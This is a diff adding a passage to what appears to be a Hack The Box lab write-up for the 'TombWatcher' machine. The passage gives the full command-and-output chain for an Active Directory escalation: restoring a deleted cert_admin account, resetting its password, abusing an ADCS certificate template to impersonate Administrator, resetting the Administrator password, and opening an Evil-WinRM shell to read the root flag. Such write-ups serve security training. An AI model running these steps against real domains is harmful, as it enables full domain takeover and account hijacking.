@@ -1073,6 +1073,195 @@ Step-by-step privilege escalation.
 
 ```
 
+
+```
+ bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' get object "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
+
+distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
+accountExpires: 9999-12-31 23:59:59.999999+00:00
+badPasswordTime: 1601-01-01 00:00:00+00:00
+badPwdCount: 0
+cn: cert_admin
+DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+codePage: 0
+countryCode: 0
+dSCorePropagationData: 2024-11-16 17:07:10+00:00
+givenName: cert_admin
+instanceType: 4
+isDeleted: True
+lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
+lastLogoff: 1601-01-01 00:00:00+00:00
+lastLogon: 1601-01-01 00:00:00+00:00
+logonCount: 0
+msDS-LastKnownRDN: cert_admin
+nTSecurityDescriptor: O:S-1-5-21-1392491010-1358638721-2126982587-512G:S-1-5-21-1392491010-1358638721-2126982587-512D:AI(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-1392491010-1358638721-2126982587-553)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;S-1-5-21-1392491010-1358638721-2126982587-553)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;S-1-5-21-1392491010-1358638721-2126982587-553)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;S-1-5-21-1392491010-1358638721-2126982587-553)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-1392491010-1358638721-2126982587-517)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;0x30;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;0x30;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;S-1-5-11)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-11)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b2-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0xf01ff;;;S-1-5-21-1392491010-1358638721-2126982587-512)(A;;0xf01ff;;;S-1-5-32-548)(A;;RC;;;S-1-5-11)(A;;0x20094;;;S-1-5-10)(A;;0xf01ff;;;S-1-5-18)(A;CIID;0xf01ff;;;S-1-5-21-1392491010-1358638721-2126982587-1106)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-1392491010-1358638721-2126982587-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-1392491010-1358638721-2126982587-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-1392491010-1358638721-2126982587-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
+name: cert_admin
+DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+objectClass: top; person; organizationalPerson; user
+objectGUID: 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+objectSid: S-1-5-21-1392491010-1358638721-2126982587-1111
+primaryGroupID: 513
+pwdLastSet: 2024-11-16 17:07:04.894636+00:00
+sAMAccountName: cert_admin
+sn: cert_admin
+uSNChanged: 13197
+uSNCreated: 13186
+userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
+whenChanged: 2024-11-16 17:07:27+00:00
+whenCreated: 2024-11-16 17:07:04+00:00
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/bloodhound-ce]
+└─$ bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' remove object "CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb"
+[+] CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb has been removed
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/bloodhound-ce]
+└─$ bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' set restore "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
+[+] CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/bloodhound-ce]
+└─$ bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' set password cert_admin 'Password123!'
+[+] Password changed successfully!
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/bloodhound-ce]
+└─$ certipy-ad req -u cert_admin -p 'Password123!' -dc-ip 10.129.144.23 \
+  -ca tombwatcher-CA-1 -template WebServer \
+  -upn administrator@tombwatcher.htb \
+  -application-policies "Client Authentication"
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/bloodhound-ce]
+└─$ ping 10.129.144.23
+PING 10.129.144.23 (10.129.144.23) 56(84) bytes of data.
+64 bytes from 10.129.144.23: icmp_seq=1 ttl=127 time=43.3 ms
+64 bytes from 10.129.144.23: icmp_seq=2 ttl=127 time=42.1 ms
+^V64 bytes from 10.129.144.23: icmp_seq=3 ttl=127 time=43.7 ms
+64 bytes from 10.129.144.23: icmp_seq=4 ttl=127 time=43.3 ms
+64 bytes from 10.129.144.23: icmp_seq=5 ttl=127 time=46.1 ms
+^V64 bytes from 10.129.144.23: icmp_seq=6 ttl=127 time=78.2 ms
+^C
+--- 10.129.144.23 ping statistics ---
+6 packets transmitted, 6 received, 0% packet loss, time 5004ms
+rtt min/avg/max/mdev = 42.095/49.456/78.185/12.904 ms
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/bloodhound-ce]
+└─$ certipy-ad req -u cert_admin -p 'Password123!' -dc-ip 10.129.144.23 \
+  -ca tombwatcher-CA-1 -template WebServer \
+  -upn administrator@tombwatcher.htb \
+  -application-policies "Client Authentication"
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 7
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@tombwatcher.htb'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/bloodhound-ce]
+└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.144.23                       
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@tombwatcher.htb'
+[*] Using principal: 'administrator@tombwatcher.htb'
+[*] Trying to get TGT...
+[-] Certificate is not valid for client authentication
+[-] Check the certificate template and ensure it has the correct EKU(s)
+[-] If you recently changed the certificate template, wait a few minutes for the change to propagate
+[-] See the wiki for more information
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/bloodhound-ce]
+└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.144.23
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@tombwatcher.htb'
+[*] Using principal: 'administrator@tombwatcher.htb'
+[*] Trying to get TGT...
+[-] Certificate is not valid for client authentication
+[-] Check the certificate template and ensure it has the correct EKU(s)
+[-] If you recently changed the certificate template, wait a few minutes for the change to propagate
+[-] See the wiki for more information
+                                                                                                                
+┌──(kali㉿kali)-[~/bloodhound-ce]
+└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.144.23 -ldap-shell
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@tombwatcher.htb'
+[*] Connecting to 'ldaps://10.129.144.23:636'
+[*] Authenticated to '10.129.144.23' as: 'u:TOMBWATCHER\\Administrator'
+Type help for list of commands
+
+# whoami
+u:TOMBWATCHER\Administrator
+
+# type c:\users\administrator\desktop\root.txt
+*** Unknown syntax: type c:\users\administrator\desktop\root.txt
+
+# cd c:\
+*** Unknown syntax: cd c:\
+
+# Bye!
+
+                                                                                                                
+┌──(kali㉿kali)-[~/bloodhound-ce]
+└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.144.23            
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@tombwatcher.htb'
+[*] Using principal: 'administrator@tombwatcher.htb'
+[*] Trying to get TGT...
+[-] Certificate is not valid for client authentication
+[-] Check the certificate template and ensure it has the correct EKU(s)
+[-] If you recently changed the certificate template, wait a few minutes for the change to propagate
+[-] See the wiki for more information
+                                                                                                                
+┌──(kali㉿kali)-[~/bloodhound-ce]
+└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.144.23 -ldap-shell
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@tombwatcher.htb'
+[*] Connecting to 'ldaps://10.129.144.23:636'
+[*] Authenticated to '10.129.144.23' as: 'u:TOMBWATCHER\\Administrator'
+Type help for list of commands
+
+# change_password administrator 'Pwned123!'
+Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
+Attempting to set new password of: Pwned123!
+Password changed successfully!
+
+# 
+
+```
+
+### Root flag
+
+```
+evil-winrm -i tombwatcher.htb -u 'Administrator' -p 'Pwned123!'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+9d7fd19fee00bb22745c88562c8dac80
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
+
+```
 ---
 ## Remediation
 
